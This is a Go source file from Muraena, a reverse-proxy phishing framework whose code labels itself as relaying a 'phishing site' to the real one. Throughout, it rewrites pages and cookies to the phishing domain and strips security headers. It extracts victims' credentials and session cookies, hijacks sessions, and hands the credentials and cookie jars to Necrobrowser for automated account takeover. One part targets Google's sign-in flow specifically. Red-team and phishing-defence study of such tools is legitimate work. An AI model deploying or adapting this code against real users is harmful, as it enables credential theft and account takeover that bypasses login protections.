package proxy

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"unicode/utf8"

	"github.com/evilsocket/islazy/tui"
	. "github.com/logrusorgru/aurora"
	"github.com/pkg/errors"

	"github.com/muraenateam/muraena/core"
	"github.com/muraenateam/muraena/module/necrobrowser"

	"github.com/muraenateam/muraena/core/db"
	"github.com/muraenateam/muraena/log"
	"github.com/muraenateam/muraena/module/statichttp"
	"github.com/muraenateam/muraena/module/tracking"
	"github.com/muraenateam/muraena/session"
)

type MuraenaProxyInit struct {
	Session  *session.Session
	Replacer *Replacer

	Origin string // proxy origin (phishing site)
	Target string // proxy destination (real site)
}

type MuraenaProxy struct {
	Session *session.Session

	Origin       string   // proxy origin (phishing site)
	Target       *url.URL // proxy destination (real site)
	Victim       string   // UUID
	ReverseProxy *ReverseProxy
	Tracker      *tracking.Tracker
	Replacer     *Replacer
}

type SessionType struct {
	Session  *session.Session
	Replacer *Replacer
}

func RedirectToHTTPS(port int) http.HandlerFunc {

	return func(w http.ResponseWriter, req *http.Request) {

		var re = regexp.MustCompile(`(:\d+)$`)
		host := re.ReplaceAllString(req.Host, "")

		newURL := fmt.Sprintf("https://%s%s", host, req.URL.String())
		if port != 443 {
			newURL = fmt.Sprintf("https://%s:%d%s", host, port, req.URL.String())
		}

		log.Info("Redirecting HTTP to HTTPS: %s", newURL)
		http.Redirect(w, req, newURL, http.StatusMovedPermanently)
	}
}

func (muraena *MuraenaProxy) RequestBodyProcessor(request *http.Request, track *tracking.Trace, base64 Base64) (err error) {
	if request.Body != nil {

		// Replacer object
		replacer := muraena.Replacer

		r := request.Body
		buf, err := ioutil.ReadAll(r)
		if err != nil {
			log.Error("%s", err)
			return err
		}
		err = request.Body.Close()
		if err != nil {
			log.Error("%s", err)
			return err
		}

		// defer r.Close()
		defer func() {
			if err = r.Close(); err != nil {
				log.Error("Error in r.Close(): %+v", err)
			}
		}()

		bodyString := string(buf)

		// Trace credentials
		if muraena.Session.Config.Tracking.Enabled && track.IsValid() {
			found, err := track.ExtractCredentials(bodyString, request)
			if err != nil {
				return errors.New(fmt.Sprintf("ExtractCredentials error: %s", err))
			}

			if found == true {
				// muraena.Tracker.ShowVictims()
			}
		}

		transform := replacer.Transform(bodyString, true, base64)
		request.Body = ioutil.NopCloser(bytes.NewReader([]byte(transform)))
		request.ContentLength = int64(len(transform))
		request.Header.Set("Content-Length", strconv.Itoa(len(transform)))
	}
	return
}

func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error) {

	sess := muraena.Session
	base64 := Base64{
		sess.Config.Transform.Base64.Enabled,
		sess.Config.Transform.Base64.Padding,
	}

	// Replacer object
	replacer := muraena.Replacer

	//
	// TRACKING
	track := muraena.Tracker.TrackRequest(request)

	// If specified in the configuration, set the User-Agent header
	if sess.Config.Transform.Request.UserAgent != "" {
		request.Header.Set("User-Agent", sess.Config.Transform.Request.UserAgent)
	}

	//
	// BODY
	//
	// Transform body
	if len(sess.Config.Transform.Request.CustomContent) > 0 {

		// Make sure the content type is not binary

		if request.Body != nil {
			r := request.Body
			buf, err := ioutil.ReadAll(r)
			if err != nil {
				log.Error("unable to transform request body: %s", err)
				goto skip
			}
			err = request.Body.Close()
			if err != nil {
				log.Error("unable to transform request body: %s", err)
				goto skip
			}

			defer r.Close()

			// CustomContent is an [][]string containing the following:
			// [0] is the string to be replaced
			// [1] is the string to replace with
			// Example: [["foo", "bar"], ["bar", "foo"]]
			if !utf8.Valid(buf) {
				log.Debug("skip binary content from request body replacement in %s", request.URL.Path)
				goto skip
			}

			bodyString := string(buf)
			for _, cc := range sess.Config.Transform.Request.CustomContent {
				bodyString = strings.Replace(bodyString, cc[0], cc[1], -1)
			}

			request.Body = io.NopCloser(bytes.NewReader([]byte(bodyString)))
			request.ContentLength = int64(len(bodyString))
			request.Header.Set("Content-Length", strconv.Itoa(len(bodyString)))

		}
	}

skip:
	{
	}

	//
	// HEADERS
	//
	// Transform query string using internal core.url instead of net.url
	query, err := core.ParseQuery(request.URL.RawQuery)
	if err != nil {
		log.Error("URL: %s \n %s", request.URL, err.Error())
	}

	for pKey := range query {
		for k, v := range query[pKey] {
			query[pKey][k] = replacer.Transform(v, true, base64)
			if v != query[pKey][k] {
				log.Verbose("[Query] Transformed %s to %s", v, query[pKey][k])
			}
		}
	}

	// Restore query string with new values
	request.URL.RawQuery = query.Encode()

	// Transform HTTP headers of interest
	request.Host = muraena.Target.Host

	for _, header := range sess.Config.Transform.Request.Headers {
		if request.Header.Get(header) != "" {
			hVal := request.Header.Get(header)
			hURL, err := replacer.transformUrl(hVal, base64)
			if err != nil {
				log.Warning("Error transforming request URL:\n%+v", err)
				continue
			}

			if hVal != hURL {
				request.Header.Set(header, hURL)
				log.Verbose("Patched HTTP %s to %s", tui.Bold(tui.Red(header)), tui.Bold(tui.Red(request.Header.Get(header))))
			}
		}
	}

	// Track request cookies (if enabled)
	if muraena.Session.Config.Tracking.TrackRequestCookies && track.IsValid() {
		if len(request.Cookies()) > 0 {
			// get victim:
			victim, err := muraena.Tracker.GetVictim(track)
			if err != nil {
				log.Warning("%s", err)
			} else {
				// store cookies in the Victim object
				for _, c := range request.Cookies() {
					if c.Domain == "" {
						c.Domain = request.Host
					}

					// remove any port from the cookie domain
					c.Domain = strings.Split(c.Domain, ":")[0]

					// make the cookie domain wildcard
					subdomains := strings.Split(c.Domain, ".")
					if len(subdomains) > 2 {
						c.Domain = fmt.Sprintf("%s", strings.Join(subdomains[1:], "."))
					} else {
						c.Domain = fmt.Sprintf("%s", c.Domain)
					}

					sessCookie := db.VictimCookie{
						Name:     c.Name,
						Value:    c.Value,
						Domain:   c.Domain,
						Path:     "/",
						HTTPOnly: false,
						Secure:   true,
						Session:  true,
						SameSite: "None",
						Expires:  "2040-01-01 00:00:00 +0000 UTC",
					}
					muraena.Tracker.PushCookie(victim, sessCookie)
				}
			}
		}
	}

	// Add extra HTTP headers
	for _, header := range sess.Config.Transform.Request.Add.Headers {
		request.Header.Set(header.Name, header.Value)
	}

	// Log line
	lhead := fmt.Sprintf("[%s]", GetSenderIP(request))
	if sess.Config.Tracking.Enabled {
		lhead = fmt.Sprintf("[%*s]%s", track.TrackerLength, track.ID, lhead)
	}

	l := fmt.Sprintf("%s [%s][%s%s%s]",
		lhead,
		Magenta(request.Method),
		Magenta(sess.Config.Proxy.Protocol), Yellow(request.Host), Cyan(request.URL.Path))

	if track.IsValid() {
		log.Debug(l)
	} else {
		log.Verbose(l)
	}

	// Remove headers
	for _, header := range sess.Config.Transform.Request.Remove.Headers {
		request.Header.Del(header)
	}

	//
	// BODY
	//

	// If the requested resource extension is no relevant, skip body processing.
	for _, extension := range sess.Config.Transform.Request.SkipExtensions {
		if strings.HasSuffix(request.URL.Path, fmt.Sprintf(".%s", extension)) {
			return
		}
	}

	if muraena.Session.Config.Tracking.Enabled && track.IsValid() {
		log.Verbose("Hijacking session: %s at %s", track.ID, request.URL.Path)
		err = track.HijackSession(request)
		if err != nil {
			log.Warning("Error Hijacking Session: %s", err)
			return nil
		}
	}

	// Transform body
	err = muraena.RequestBodyProcessor(request, track, base64)
	if err != nil {
		return
	}

	return nil
}

// GetSenderIP returns the IP address of the client that sent the request.
// It checks the following headers in cascade order:
// - True-Client-IP
// - CF-Connecting-IP
// - X-Forwarded-For
// If none of the headers contain a valid IP, it falls back to RemoteAddr.
// TODO Update Watchdog to use this function
func GetSenderIP(req *http.Request) string {
	// Define the headers to check in cascade order
	headerNames := []string{"True-Client-IP", "CF-Connecting-IP", "X-Forwarded-For"}

	// Loop through the headers and return the first non-empty IP address found
	for _, headerName := range headerNames {
		ipAddress := req.Header.Get(headerName)
		if ipAddress != "" {
			// The header may contain a comma-separated list of IP addresses; the client's IP is the leftmost one
			parts := strings.Split(ipAddress, ",")
			clientIP := strings.TrimSpace(parts[0])
			return clientIP
		}
	}

	log.Verbose("Sender IP not found in headers, falling back to RemoteAddr")

	// If none of the headers contain a valid IP, fall back to RemoteAddr
	ipPort := req.RemoteAddr
	parts := strings.Split(ipPort, ":")
	ipAddress := parts[0]

	return ipAddress
}

func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err error) {

	sess := muraena.Session
	base64 := Base64{
		sess.Config.Transform.Base64.Enabled,
		sess.Config.Transform.Base64.Padding,
	}

	if response.Request.Header.Get(muraena.Tracker.LandingHeader) != "" {
		response.StatusCode = 302
		response.Header.Add(muraena.Tracker.Header, response.Request.Header.Get(muraena.Tracker.Header))
		response.Header.Add("Set-Cookie",
			fmt.Sprintf("%s=%s; Domain=%s; Path=/; Expires=Wed, 30 Aug 2029 00:00:00 GMT",
				muraena.Session.Config.Tracking.Trace.Identifier, response.Request.Header.Get(muraena.Tracker.Header),
				muraena.Session.Config.Proxy.Phishing))
		response.Header.Set("Location", response.Request.Header.Get(muraena.Tracker.LandingHeader))
		return
	}

	// Replacer object
	replacer := muraena.Replacer

	// Add extra HTTP headers
	for _, header := range sess.Config.Transform.Response.Add.Headers {
		response.Header.Set(header.Name, header.Value)
	}

	//
	// HEADERS
	//
	// delete security headers
	for _, header := range sess.Config.Transform.Response.Remove.Headers {
		response.Header.Del(header)
	}

	// transform headers of interest
	for _, header := range sess.Config.Transform.Response.Headers {
		if response.Header.Get(header) != "" {
			if header == "Set-Cookie" {
				for k, value := range response.Header["Set-Cookie"] {
					response.Header["Set-Cookie"][k] = replacer.Transform(value, false, base64)

					// When the cookie is set for a wildcard domain, we need to replace the domain
					// with the phishing domain.
					if strings.Contains(response.Header["Set-Cookie"][k], "domain="+replacer.WildcardPrefix()) {
						// Replace the domain
						domain := strings.Split(response.Header["Set-Cookie"][k], "domain=")[1]
						domain = strings.Split(domain, ";")[0]
						newDomain := "." + replacer.Phishing
						response.Header["Set-Cookie"][k] = strings.Replace(response.Header["Set-Cookie"][k], domain, newDomain, 1)
					}

					// Further, if the SameSite attribute is set in the configuration, we need to patch the cookie
					if sess.Config.Transform.Response.Cookie.SameSite != "" {
						cookie := response.Header["Set-Cookie"][k]

						// if cookie contains SameSite (case insensitive)
						samesite := ""
						if strings.Contains(strings.ToLower(cookie), "samesite") {
							samesite = strings.Split(cookie, "SameSite=")[1]
							samesite = strings.Split(samesite, ";")[0]
						}

						if samesite != "" {
							cookie = strings.Replace(cookie, samesite, sess.Config.Transform.Response.Cookie.SameSite, 1)
						} else {
							cookie = cookie + ";SameSite=" + sess.Config.Transform.Response.Cookie.SameSite
						}

						response.Header["Set-Cookie"][k] = cookie
					}

					log.Verbose("Set-Cookie: %s", response.Header["Set-Cookie"][k])
				}
				// } else if header == "Location" {
				// 	response.Header.Set(header, replacer.Transform(response.Header.Get(header), false, base64))
			} else {
				response.Header.Set(header, replacer.Transform(response.Header.Get(header), false, base64))
			}
		}
	}

	// Media LandingType handling.
	// Prevent processing of unwanted media types
	mediaType := strings.ToLower(response.Header.Get("Content-Type"))
	for _, skip := range sess.Config.Transform.Response.SkipContentType {
		skip = strings.ToLower(skip)

		if mediaType == skip {
			return
		}

		if strings.HasSuffix(skip, "/*") &&
			strings.Split(mediaType, "/")[0] == strings.Split(skip, "/*")[0] {
			return
		}
	}

	//
	// Trace
	//
	if muraena.Session.Config.Tracking.Enabled {
		trace := muraena.Tracker.TrackResponse(response)
		if trace.IsValid() {

			var err error
			victim, err := muraena.Tracker.GetVictim(trace)
			if err != nil {
				log.Warning("Error: cannot retrieve Victim from tracker: %s", err)
			}

			if victim != nil {
				// before transforming headers like cookies, store the cookies in the CookieJar
				for _, c := range response.Cookies() {
					if c.Domain == "" {
						c.Domain = response.Request.Host
					}

					c.Domain = strings.Replace(c.Domain, ":443", "", -1)
					sessCookie := db.VictimCookie{
						Name:     c.Name,
						Value:    c.Value,
						Domain:   c.Domain,
						Expires:  c.Expires.String(), // will be set by necrobrowser
						Path:     c.Path,
						HTTPOnly: c.HttpOnly,
						Secure:   c.Secure,
					}

					muraena.Tracker.PushCookie(victim, sessCookie)
				}

				// Trace credentials
				found, err := trace.ExtractCredentialsFromResponseHeaders(response)
				if err != nil {
					return errors.New(fmt.Sprintf("ExtractCredentialsFromResponseHeaders error: %s", err))
				}

				if found == true {
					// muraena.Tracker.ShowVictims()
				}

				if muraena.Session.Config.Necrobrowser.Enabled {
					m, err := muraena.Session.Module("necrobrowser")
					if err != nil {
						log.Error("%s", err)
					} else {
						nb, ok := m.(*necrobrowser.Necrobrowser)
						if ok {

							getSession := false
							for _, c := range muraena.Session.Config.Necrobrowser.SensitiveLocations.AuthSessionResponse {
								if response.Request.URL.Path == c {
									// log.Debug("Going to hijack response: %s (Victim: %+v)", response.Request.URL.Path, victim.ID)
									getSession = true
									break
								}
							}

							if getSession {
								// Pass credentials
								creds, err := json.MarshalIndent(victim.Credentials, "", "\t")
								if err != nil {
									log.Warning(err.Error())
								} else {
									err := victim.GetVictimCookiejar()
									if err != nil {
										log.Error(err.Error())
									} else {
										go nb.Instrument(victim.ID, victim.Cookies, string(creds))
									}
								}
							}
						}
					}
				}

			} else {
				if len(response.Cookies()) > 0 {
					log.Verbose("[TODO] Missing cookies to track: \n%s\n%+v", response.Request.URL, response.Cookies())
				}
			}

		}

	}

	//
	// BODY
	//
	// unpack response body
	modResponse := Response{Response: response}
	responseBuffer, err := modResponse.Unpack()
	if err != nil {
		log.Info("Error reading/deflating response: %+v", err)
		return err
	}

	// process body and pack again
	newBody := replacer.Transform(string(responseBuffer), false, base64)

	// Ugly Google patch
	if strings.Contains(response.Request.URL.Path, "AccountsSignInUi/data/batchexecute") {
		if strings.Contains(newBody, muraena.Session.Config.Proxy.Phishing) {
			if strings.HasPrefix(newBody, ")]}'\n\n") {
				newBody = patchGoogleStructs(newBody)
			}
		}
	}

	err = modResponse.Encode([]byte(newBody))
	if err != nil {
		log.Info("Error processing the body: %+v", err)
		return err
	}
	return nil
}

func (muraena *MuraenaProxy) ProxyErrHandler(response http.ResponseWriter, request *http.Request, err error) {
	log.Debug("[errHandler] \n\t%+v \n\t in request %s %s%s", err, request.Method, request.Host, request.URL.Path)
}

func (init *MuraenaProxyInit) Spawn() *MuraenaProxy {
	sess := init.Session

	destination, err := url.Parse(init.Target)
	if err != nil {
		log.Info("Error parsing destination URL: %s", err)
	}

	muraena := &MuraenaProxy{
		Session:      sess,
		Origin:       init.Origin,
		Target:       destination,
		ReverseProxy: NewSingleHostReverseProxy(destination),
		Replacer:     init.Replacer,
	}

	m, err := sess.Module("tracker")
	if err != nil {
		log.Error("%s", err)
	}

	tracker, ok := m.(*tracking.Tracker)
	if ok {
		muraena.Tracker = tracker
	}

	proxy := muraena.ReverseProxy

	director := proxy.Director
	proxy.Director = func(r *http.Request) {

		// If request matches the redirect list, redirect it without processing
		if redirect := muraena.getHTTPRedirect(r); redirect != nil {
			// Retrieve the http.ResponseWriter from the context
			if rw, ok := r.Context().Value(0).(http.ResponseWriter); ok {
				http.Redirect(rw, r, redirect.RedirectTo, redirect.HTTPStatusCode)
			} else {
				log.Error("Failed to retrieve the http.ResponseWriter from the context")
			}

			return
		}

		if err = muraena.RequestProcessor(r); err != nil {
			log.Error(err.Error())
			return
		}

		// Send the request to the target
		director(r)
	}
	proxy.ModifyResponse = muraena.ResponseProcessor
	proxy.ErrorHandler = muraena.ProxyErrHandler

	// Attach TLS configurations to proxy
	transport := http.Transport{TLSClientConfig: sess.GetTLSClientConfig()}
	if *sess.Options.Proxy {
		// If HTTP_PROXY or HTTPS_PROXY env variables are defined
		// all the proxy traffic will be forwarded to the defined proxy.
		// Basically a MiTM of the MiTM :)
		transport.Proxy = http.ProxyFromEnvironment
		transport.TLSClientConfig.InsecureSkipVerify = true
	}
	proxy.Transport = &transport

	return muraena
}

func (muraena *MuraenaProxy) getHTTPRedirect(request *http.Request) *session.Redirect {

	for _, drop := range muraena.Session.Config.Redirects {
		// Skip if Hostname is set and the request Hostname is different from the expected one
		if drop.Hostname != "" && request.Host != drop.Hostname {
			continue
		}

		// Skip if Path is set and the request Path is different from the expected one
		if drop.Path != "" && request.URL.Path != drop.Path {
			continue
		}

		// Skip if Query is set and the request Query is different from the expected one
		if drop.Query != "" && request.URL.RawQuery != drop.Query {
			continue
		}

		log.Info("[Dropped] %s", request.URL.String())

		// Invalid HTTP code fallback to 302
		if drop.HTTPStatusCode == 0 {
			drop.HTTPStatusCode = 302
		}

		return &drop
	}

	return nil
}

func (st SessionType) HandleFood(response http.ResponseWriter, request *http.Request) {
	var destination string

	if st.Session.Config.StaticServer.Enabled {
		m, err := st.Session.Module("static.http")
		if err != nil {
			log.Error("%s", err)
		}

		ss, ok := m.(*statichttp.StaticHTTP)
		if ok {
			destination = ss.GetNewDestination(request.URL)
		}
	}

	if destination == "" {

		// CustomContent Subdomain Mapping
		subs := strings.Split(request.Host, st.Replacer.Phishing)
		if len(subs) > 1 {
			sub := strings.Replace(subs[0], ".", "", -1)
			for _, m := range st.Session.Config.Origins.SubdomainMap {
				if m[0] == sub {
					request.Host = fmt.Sprintf("%s.%s", m[1], st.Replacer.Phishing)
					break
				}
			}
		}

		if strings.Contains(request.Host, st.Replacer.getCustomWildCardSeparator()) {
			request.Host = st.Replacer.PatchComposedWildcardURL(request.Host)
		}

		if strings.HasPrefix(request.Host, st.Replacer.ExternalOriginPrefix) { // external domain mapping
			for domain, subMapping := range st.Replacer.GetOrigins() {
				// even if the resource is aa.bb.cc.dom.tld, the mapping is always one level as in www--2.phishing.tld.
				// This is important since wildcard SSL certs do not handle N levels of nesting
				if subMapping == strings.Split(request.Host, ".")[0] {
					destination = fmt.Sprintf("%s%s", st.Session.Config.Proxy.Protocol,
						strings.Replace(request.Host,
							fmt.Sprintf("%s.%s", subMapping, st.Replacer.Phishing),
							domain, -1))
					break
				}
			}
		} else {
			destination = fmt.Sprintf("%s%s", st.Session.Config.Proxy.Protocol,
				strings.Replace(request.Host, st.Replacer.Phishing, st.Replacer.Target, -1))
		}
	}

	// PortMapping
	if st.Session.Config.Proxy.PortMap != "" {
		destURL, err := url.Parse(destination)
		if err != nil {
			log.Error("%s", err)
		} else {
			port := destURL.Port()
			if port == "" && destURL.Scheme == "https" {
				port = "443"
				destination = fmt.Sprintf("%s:%s", destination, port)
			} else if port == "" && destURL.Scheme == "http" {
				port = "80"
				destination = fmt.Sprintf("%s:%s", destination, port)
			}

			if strings.HasPrefix(st.Session.Config.Proxy.PortMap, fmt.Sprintf("%s:", port)) {
				newport := strings.Split(st.Session.Config.Proxy.PortMap, ":")[1]
				destination = strings.Replace(destination, fmt.Sprintf(":%s", port), fmt.Sprintf(":%s", newport), 1)
			}
		}
	}

	if destination == "" {
		log.Error("Unexpected request at: %s", request.Host)
		return
	}

	muraena := &MuraenaProxyInit{
		Origin:   request.Host,
		Target:   destination,
		Session:  st.Session,
		Replacer: st.Replacer,
	}

	muraenaProxy := muraena.Spawn()
	if muraenaProxy == nil {
		return
	}

	// The httputil ReverseProxy leaks some information via X-Forwarded-For header:
	// https://github.com/golang/go/blob/master/src/net/http/httputil/reverseproxy.go#L249
	//
	// Therefore, the actual version of reverseproxy.go used in this project
	// has been slightly modified in the ServeHTTP method:
	muraenaProxy.ReverseProxy.ServeHTTP(response, request)
}

// patchGoogleStructs is a temporary workaround for the Google Structs issue.
func patchGoogleStructs(input string) string {
	var builder strings.Builder

	// Splitting the input into sections and processing
	scanner := bufio.NewScanner(strings.NewReader(input))
	for scanner.Scan() {
		line := scanner.Text()

		// Check if the line is a number (size indicator)
		if size, err := strconv.Atoi(line); err == nil {
			// Read the next line (message content)
			if scanner.Scan() {
				message := scanner.Text()

				// Calculate the new size including the newline characters
				newSize := len(message) + 2 // +2 for the two newline characters

				// Update the size if it's different
				if newSize != size+1 {
					fmt.Fprintln(&builder, newSize)
				} else {
					fmt.Fprintln(&builder, size)
				}

				// Print the message content
				fmt.Fprintln(&builder, message)
			} else {
				// fmt.Fprintln(&builder, "Error: Expected message content after size indicator.")
				return builder.String()
			}
		} else {
			// Print non-size indicator lines as is
			fmt.Fprintln(&builder, line)
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Fprintln(&builder, "Error reading input:", err)
	}

	return builder.String()
}
